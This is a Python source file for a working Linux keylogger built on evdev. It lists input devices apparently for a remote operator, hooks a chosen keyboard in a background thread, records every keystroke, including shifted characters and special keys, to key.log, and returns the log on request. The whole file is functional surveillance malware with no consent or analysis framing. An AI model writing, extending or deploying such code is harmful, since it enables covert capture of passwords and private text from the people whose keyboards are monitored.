from evdev import InputDevice, categorize, ecodes, list_devices
from datetime import datetime
import threading
import time  

normal_map = {
    "KEY_A": "a", "KEY_B": "b", "KEY_C": "c", "KEY_D": "d",
    "KEY_E": "e", "KEY_F": "f", "KEY_G": "g", "KEY_H": "h",
    "KEY_I": "i", "KEY_J": "j", "KEY_K": "k", "KEY_L": "l",
    "KEY_M": "m", "KEY_N": "n", "KEY_O": "o", "KEY_P": "p",
    "KEY_Q": "q", "KEY_R": "r", "KEY_S": "s", "KEY_T": "t",
    "KEY_U": "u", "KEY_V": "v", "KEY_W": "w", "KEY_X": "x",
    "KEY_Y": "y", "KEY_Z": "z",

    "KEY_1": "1", "KEY_2": "2", "KEY_3": "3", "KEY_4": "4",
    "KEY_5": "5", "KEY_6": "6", "KEY_7": "7", "KEY_8": "8",
    "KEY_9": "9", "KEY_0": "0",

    "KEY_SPACE": " ",
    "KEY_MINUS": "-", "KEY_EQUAL": "=",
    "KEY_LEFTBRACE": "[", "KEY_RIGHTBRACE": "]", "KEY_BACKSLASH": "\\",
    "KEY_SEMICOLON": ";", "KEY_APOSTROPHE": "'", "KEY_GRAVE": "`",
    "KEY_COMMA": ",", "KEY_DOT": ".", "KEY_SLASH": "/",
    "KEY_TAB": "\t", "KEY_ENTER": "\n",

    "KEY_KP0": "0", "KEY_KP1": "1", "KEY_KP2": "2", "KEY_KP3": "3",
    "KEY_KP4": "4", "KEY_KP5": "5", "KEY_KP6": "6", "KEY_KP7": "7",
    "KEY_KP8": "8", "KEY_KP9": "9", "KEY_KPDOT": ".", "KEY_KPPLUS": "+",
    "KEY_KPMINUS": "-", "KEY_KPASTERISK": "*", "KEY_KPSLASH": "/",
    "KEY_KPCOMMA": ",", "KEY_KPEQUAL": "=", "KEY_KPENTER": "\n",
}

shift_map = {
    "KEY_A": "A", "KEY_B": "B", "KEY_C": "C", "KEY_D": "D",
    "KEY_E": "E", "KEY_F": "F", "KEY_G": "G", "KEY_H": "H",
    "KEY_I": "I", "KEY_J": "J", "KEY_K": "K", "KEY_L": "L",
    "KEY_M": "M", "KEY_N": "N", "KEY_O": "O", "KEY_P": "P",
    "KEY_Q": "Q", "KEY_R": "R", "KEY_S": "S", "KEY_T": "T",
    "KEY_U": "U", "KEY_V": "V", "KEY_W": "W", "KEY_X": "X",
    "KEY_Y": "Y", "KEY_Z": "Z",

    "KEY_1": "!", "KEY_2": "@", "KEY_3": "#", "KEY_4": "$",
    "KEY_5": "%", "KEY_6": "^", "KEY_7": "&", "KEY_8": "*",
    "KEY_9": "(", "KEY_0": ")",

    "KEY_MINUS": "_", "KEY_EQUAL": "+", "KEY_LEFTBRACE": "{",
    "KEY_RIGHTBRACE": "}", "KEY_BACKSLASH": "|", "KEY_SEMICOLON": ":",
    "KEY_APOSTROPHE": '"', "KEY_GRAVE": "~", "KEY_COMMA": "<",
    "KEY_DOT": ">", "KEY_SLASH": "?", "KEY_SPACE": " ",
    "KEY_TAB": "\t", "KEY_ENTER": "\n",
}

logger_stop_event = None
logger_thread = None
logger_device = None


def list_devices_for_remote():
    devices = [InputDevice(path) for path in list_devices()]
    lines = [f"{i}: {dev.path} - {dev.name}" for i, dev in enumerate(devices)]
    return "\n".join(lines), devices


def start_logger(log_file="key.log"):
    global logger_stop_event, logger_thread, logger_device

    #print(f"[DEBUG] start_logger called, logger_device={logger_device}")
    
    if logger_device is None:
        print("[ERROR] No keyboard device was selected on hosta!")
        return

    logger_stop_event = threading.Event()

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"--- Start: {timestamp} ---\n")

    def logging_thread():
        dev = logger_device 
        try:
            print(f"[KL] Key Logger started on {dev.path} - {dev.name}")

            shift = False
            caps = False

            for event in dev.read_loop():
                if logger_stop_event.is_set():
                    break
                if event.type != ecodes.EV_KEY:
                    continue

                key_event = categorize(event)
                key = key_event.keycode
                if isinstance(key, list):
                    key = key[0]

                is_press = key_event.keystate in (key_event.key_down, key_event.key_hold)

                if key in ("KEY_LEFTSHIFT", "KEY_RIGHTSHIFT"):
                    shift = is_press
                    continue

                if key == "KEY_CAPSLOCK" and key_event.keystate == key_event.key_down:
                    caps = not caps
                    continue

                if not is_press:
                    continue

                char = None
                if key in normal_map:
                    if key.startswith("KEY_") and len(key) == 5 and key[4].isalpha():
                        use_upper = shift ^ caps
                        char = shift_map.get(key, normal_map[key]) if use_upper else normal_map[key]
                    else:
                        char = shift_map.get(key, normal_map[key]) if shift else normal_map[key]

                if char is not None:
                    with open(log_file, "a", encoding="utf-8") as f:
                        f.write(char)
                elif key == "KEY_BACKSPACE":
                    with open(log_file, "a", encoding="utf-8") as f:
                        f.write("[BACKSPACE]")
                elif key == "KEY_ESC":
                    with open(log_file, "a", encoding="utf-8") as f:
                        f.write("[ESC]")
                elif key.startswith("KEY_"):
                    with open(log_file, "a", encoding="utf-8") as f:
                        f.write(f"[{key}]")

        except Exception as e:
            print(f"[KL] Key logger error: {e}")
        finally:
            with open(log_file, "a", encoding="utf-8") as f:
                f.write("-" * 60 + "\n\n")
            print("[KL] Key logger stopped.")

    logger_thread = threading.Thread(target=logging_thread, daemon=True)
    logger_thread.start()


def stop_logger():
    global logger_stop_event, logger_thread
    if logger_stop_event:
        logger_stop_event.set()
        if logger_thread and logger_thread.is_alive():
            logger_thread.join(timeout=5.0) 
        logger_stop_event = None
        logger_thread = None
        time.sleep(0.5)


def get_key_log_content(log_file="key.log"):
    try:
        with open(log_file, "r", encoding="utf-8") as f:
            return f.read()
    except FileNotFoundError:
        return "No key.log found yet."
    except Exception as e:
        return f"Error reading log: {e}"